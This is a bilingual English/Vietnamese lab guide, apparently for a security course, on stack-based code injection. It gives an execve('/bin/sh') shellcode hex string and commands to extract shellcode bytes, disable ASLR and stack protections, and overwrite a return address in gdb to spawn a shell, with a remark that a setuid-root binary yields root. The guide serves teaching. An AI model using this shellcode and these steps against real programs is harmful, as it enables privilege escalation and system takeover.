# Tips for code injection lab:
### Shellcode
1. Write shellcode program in assembly language (sh.asm), compile with nasm (sh.o) then link with ld to generate executable file (sh)<br>
(Viết chương trình shellcode bằng hợp ngữ, biên dịch (nasm) và liên kết (ld) để tạo chương trình thực thi)
2. Run the following script to get the hex string of shellcode:<br>
(Chạy bash script dưới đây ở dòng lệnh để tạo chuỗi hex của shellcode:)<br>
`$> for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`
<br>--> hex string generated: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80`<br>
or run this script to generate shellcode binary file:<br>
(Hoặc chạy bash script dưới đây ở dòng lệnh để sinh binary file mã shellcode nếu inject bằng cách đọc file)<br>
`$> for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -ne '\x'$i >> sh.bin; done;` <br>
3. Estimate buffer size *nnn* of vulnerable program with input strings of various length (eg. `./vuln.out $(python -c "print('a'*nnn)"`)<br>
(Ước lượng size *nnn* từ đỉnh stack đến eip khi biên dịch chương trình với option `-fno-stack-protector` khi gcc)<br>
4. Compute the distance between buffer (esp) and return address to determine the padding bytes will be injected along with the sheelcode.<br>
(Tính toán khoảng cách từ buffer đến eip để xác định padding bytes chèn cùng với shellcode)<br>
### Prepare for the lab environment:
1. Turn off OS's address space layout randomization (`sudo sysctl -w kernel.randomize_va_space=0`)<br>
(Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên khi load chương trình của HĐH)<br>
2. Compile program with options to defeat stack protecting mechanism and code execution on stack:<br>
(Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack)<br>
`$> gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`<br>
3. Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:<br>
`$> sudo ln -sf /bin/zsh /bin/sh`<br>
### Conducting the attack
1. Load vuln.out in gdb <br>
(Nạp vuln.out trong gdb)<br>
`$> gdb vuln.out`<br>
2. Set break point after strcpy instruction <br>
(Đặt điểm dừng chương trình sau lệnh strcpy)<br>
3. Run program in gdb with injecting argument <br>
(Khởi chạy chương trình trong gdb, chèn chuỗi hex của shellcode trên dòng lệnh)<br>
`(gdb-peda)r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")`<br>
4. Watch the stack memory from esp (stack top):<br>
(Quan sát bộ nhớ stack từ esp)<br>
`(gdb-peda) x/80xb $esp`
5. Identify the return address while watching out the stack, then replace `\xff\xff\xff\xff` with the value of esp<br>
(Xác định vị trí của địa chỉ trả về trong stack, thay thế `\xff\xff\xff\xff` với giá trị của esp)<br>
`set *<address of return address> = <address of esp>`<br>
6. Continue executing program, you should now in the new bash shell:<br>
(Thực thi tiếp chương trình, sẽ thấy xuất hiện dấu nhắc shell --> thực thi được shellcode)<br>
`(gdb-peda) continue`<br>
`$_` <-- you are in the new bash. If vuln.out is set with root as the owner, you will be root in the new shell!  <br>
7. Return to gdb<br>
`$>exit`<br>
`(gdb-peda)`




